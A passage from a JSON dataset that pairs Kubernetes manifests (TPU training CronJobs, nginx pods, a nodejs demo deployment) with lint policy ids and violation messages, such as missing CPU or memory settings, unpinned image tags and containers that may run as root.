metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "3112",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "3113",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"train\" has cpu request 0"
  },
  {
    "id": "3114",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "3115",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "3116",
    "manifest_path": "data/manifests/the_stack_sample/sample_0928.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-efficientnet-conv-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/efficientnet/main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --use_cache=False\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --train_batch_size=4096\n          - --train_steps=109474\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/efficientnet/conv/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-efficientnet-conv-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "3117",
    "manifest_path": "data/manifests/the_stack_sample/sample_0929.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7687\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3118",
    "manifest_path": "data/manifests/the_stack_sample/sample_0929.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7687\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "3119",
    "manifest_path": "data/manifests/the_stack_sample/sample_0929.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7687\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "3120",
    "manifest_path": "data/manifests/the_stack_sample/sample_0929.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7687\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "3121",
    "manifest_path": "data/manifests/the_stack_sample/sample_0929.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7687\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "3122",
    "manifest_path": "data/manifests/the_stack_sample/sample_0930.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9543\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3123",
    "manifest_path": "data/manifests/the_stack_sample/sample_0930.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9543\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "3124",
    "manifest_path": "data/manifests/the_stack_sample/sample_0930.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9543\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "3125",
    "manifest_path": "data/manifests/the_stack_sample/sample_0930.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9543\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "3126",
    "manifest_path": "data/manifests/the_stack_sample/sample_0930.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9543\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "3127",
    "manifest_path": "data/manifests/the_stack_sample/sample_0932.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: inline-pod\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx-inline\n    volumeMounts:\n    - name: my-csi-volume\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: my-csi-volume\n    csi:\n      driver: cinder.csi.openstack.org\n      volumeAttributes:\n        capacity: 1Gi\n      readOnly: false\n      fsType: ext4\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-inline\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3128",
    "manifest_path": "data/manifests/the_stack_sample/sample_0932.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: inline-pod\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx-inline\n    volumeMounts:\n    - name: my-csi-volume\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: my-csi-volume\n    csi:\n      driver: cinder.csi.openstack.org\n      volumeAttributes:\n        capacity: 1Gi\n      readOnly: false\n      fsType: ext4\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-inline\" does not have a read-only root file system"
  },
  {
    "id": "3129",
    "manifest_path": "data/manifests/the_stack_sample/sample_0932.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: inline-pod\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx-inline\n    volumeMounts:\n    - name: my-csi-volume\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: my-csi-volume\n    csi:\n      driver: cinder.csi.openstack.org\n      volumeAttributes:\n        capacity: 1Gi\n      readOnly: false\n      fsType: ext4\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-inline\" is not set to runAsNonRoot"
  },
  {
    "id": "3130",
    "manifest_path": "data/manifests/the_stack_sample/sample_0932.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: inline-pod\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx-inline\n    volumeMounts:\n    - name: my-csi-volume\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: my-csi-volume\n    csi:\n      driver: cinder.csi.openstack.org\n      volumeAttributes:\n        capacity: 1Gi\n      readOnly: false\n      fsType: ext4\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-inline\" has cpu request 0"
  },
  {
    "id": "3131",
    "manifest_path": "data/manifests/the_stack_sample/sample_0932.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: inline-pod\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx-inline\n    volumeMounts:\n    - name: my-csi-volume\n      mountPath: /var/lib/www/html\n  volumes:\n  - name: my-csi-volume\n    csi:\n      driver: cinder.csi.openstack.org\n      volumeAttributes:\n        capacity: 1Gi\n      readOnly: false\n      fsType: ext4\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-inline\" has memory limit 0"
  },
  {
    "id": "3132",
    "manifest_path": "data/manifests/the_stack_sample/sample_0933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ecsdemo-nodejs\n  labels:\n    app: ecsdemo-nodejs\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ecsdemo-nodejs\n  template:\n    metadata:\n      labels:\n        app: ecsdemo-nodejs\n    spec:\n      containers:\n      - image: brentley/ecsdemo-nodejs:latest\n        imagePullPolicy: Always\n        name: ecsdemo-nodejs\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ecsdemo-nodejs\" is using an invalid container image, \"brentley/ecsdemo-nodejs:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3133",
    "manifest_path": "data/manifests/the_stack_sample/sample_0933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ecsdemo-nodejs\n  labels:\n    app: ecsdemo-nodejs\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ecsdemo-nodejs\n  template:\n    metadata:\n      labels:\n        app: ecsdemo-nodejs\n    spec:\n      containers:\n      - image: brentley/ecsdemo-nodejs:latest\n        imagePullPolicy: Always\n        name: ecsdemo-nodejs\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3134",
    "manifest_path": "data/manifests/the_stack_sample/sample_0933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ecsdemo-nodejs\n  labels:\n    app: ecsdemo-nodejs\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ecsdemo-nodejs\n  template:\n    metadata:\n      labels:\n        app: ecsdemo-nodejs\n    spec:\n      containers:\n      - image: brentley/ecsdemo-nodejs:latest\n        imagePullPolicy: Always\n        name: ecsdemo-nodejs\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ecsdemo-nodejs\" does not have a read-only root file system"
  },
  {
    "id": "3135",
    "manifest_path": "data/manifests/the_stack_sample/sample_0933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ecsdemo-nodejs\n  labels:\n    app: ecsdemo-nodejs\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ecsdemo-nodejs\n  template:\n    metadata:\n      labels:\n        app: ecsdemo-nodejs\n    spec:\n      containers:\n      - image: brentley/ecsdemo-nodejs:latest\n        imagePullPolicy: Always\n        name: ecsdemo-nodejs\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ecsdemo-nodejs\" is not set to runAsNonRoot"
  },
  {
    "id": "3136",
    "manifest_path": "data/manifests/the_stack_sample/sample_0933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ecsdemo-nodejs\n  labels:\n    app: ecsdemo-nodejs\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ecsdemo-nodejs\n  template:\n    metadata:\n      labels:\n        app: ecsdemo-nodejs\n    spec:\n      containers:\n      - image: brentley/ecsdemo-nodejs:latest\n        imagePullPolicy: Always\n        name: ecsdemo-nodejs\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ecsdemo-nodejs\" has cpu request 0"
  },
  {
    "id": "3137",
    "manifest_path": "data/manifests/the_stack_sample/sample_0933.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ecsdemo-nodejs\n  labels:\n    app: ecsdemo-nodejs\n  namespace: default\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ecsdemo-nodejs\n  template:\n    metadata:\n      labels:\n        app: ecsdemo-nodejs\n    spec:\n      containers:\n      - image: brentley/ecsdemo-nodejs:latest\n        imagePullPolicy: Always\n        name: ecsdemo-nodejs\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ecsdemo-nodejs\" has memory limit 0"
  },
  {
    "id": "3138",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
